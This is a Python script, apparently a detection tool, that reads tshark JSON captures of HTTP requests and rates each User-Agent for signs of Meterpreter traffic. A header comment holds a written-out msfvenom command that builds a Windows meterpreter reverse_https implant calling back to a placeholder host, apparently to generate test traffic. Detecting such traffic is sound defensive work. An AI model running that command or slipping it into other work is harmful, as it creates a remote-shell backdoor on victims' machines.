
# Meterpreter Traffic Analysis With Python V1.0.
#
# Copyright (C) 2021  Iven Leni Fernandez
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import json
import user_agent
import tabulate #
import time

# IP Address
# Domain name
# User-Agent
# Host Name
# File Hashes
# Specific pattern

# https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/user_agent.rb
# msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=consulting.example.org LPORT=4443 > metasploit_https.exe
#############
# tshark -2 -R "http.request.method==GET or http.request.method==POST" -r input.pcap -T json >output.json
# tshark -2 -R "ip.addr==X.X.X.X and http.request.method==GET" -r input.pcap -T json >output.json
#############

packet_list = []
packet_dic = {}
with open("output01.json") as json_file:
    data_dict = json.load(json_file)

for x in range(0,len(data_dict)):

    if list(data_dict[x]['_source']['layers']['http'])[0] != '_ws.expert':
        request_method = list(data_dict[x]['_source']['layers']['http'])[0]
    else:
        request_method = list(data_dict[x]['_source']['layers']['http'])[1]

    packet_dic = {'No':'', 'requests':'', 'src':'', 'dst':'', 'user_agent': '', 'meterpreter_status':''}
    packet_dic['No'] = x
    packet_dic['requests'] = data_dict[x]['_source']['layers']['http'][request_method]['http.request.method']
    packet_dic['src'] = data_dict[x]['_source']['layers']['ip']['ip.src']
    packet_dic['dst'] = data_dict[x]['_source']['layers']['ip']['ip.dst']

    usr_agt_index = list(data_dict[x]['_source']['layers']['http'])[4]

    packet_dic['user_agent'] = data_dict[x]['_source']['layers']['http'][usr_agt_index]
    packet_dic['meterpreter_status'] = (f"{user_agent.user_agent_check(packet_dic['user_agent'])} %")

    packet_list.append(packet_dic)

    time.sleep(0.9)

headers = ['No', 'Requests', 'SRC', 'DST', 'User Agent', 'Meterpreter Status']

rows =  [a.values() for a in packet_list] ##
print(tabulate.tabulate(rows, headers, tablefmt='grid'))